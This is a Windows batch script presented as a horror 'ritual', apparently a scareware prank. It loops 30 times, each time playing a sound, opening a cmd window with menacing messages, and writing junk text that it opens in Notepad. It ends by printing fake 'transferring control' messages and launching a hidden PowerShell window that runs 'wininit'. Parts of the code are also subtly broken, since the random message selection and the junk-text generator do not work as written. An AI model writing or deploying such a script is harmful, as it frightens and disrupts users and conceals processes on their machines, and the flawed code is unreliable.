@echo off
setlocal EnableDelayedExpansion
title EXP.exe - Ritual in Progress

set msg[0]=The system cannot find the path specified.
set msg[1]=NEVERENDINGHELLNEVERENDINGHELLNEVERENDINGHELLNEVERENDINGHELL...
set msg[2]=ZW1neWVya3B5dWZjZGp0d3B5d3RtY3Zx...
set msg[3]=FOLDER: YAWA TPEK CANNOT BE FOUND.
set msg[4]=YOUR FATE WILL KEEP GOING UNTIL [DATE NOT FOUND]

for /L %%a in (1,1,30) do (
    set /a r=!random!%%5
    
    powershell -c (New-Object Media.SoundPlayer "MESSAGE.wav").Play()
    
    start "EXP.exe" cmd.exe /k "echo !msg[%r%]!"
    
    set "junk="
    for /L %%i in (1,1,100) do (
        set /a char=!random!%%36
        if !char! lss 10 (
            set /a code=!char!+48
        ) else (
            set /a code=!char!+55
        )
        for %%A in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9) do (
            if !code! gtr 0 set "junk=!junk!%%A"
        )
    )
    
    echo !junk! > tempnote.txt
    start notepad tempnote.txt

    ping -n 1 localhost >nul
)

cls
echo INITIAL SEQUENCE COMPLETE...
timeout /t 2 >nul
echo TRANSFERRING CONTROL TO SYSTEM INTERFACE...
timeout /t 3 >nul
powershell -windowstyle hidden -command "Start-Process powershell -ArgumentList '-NoExit','-Command','wininit'"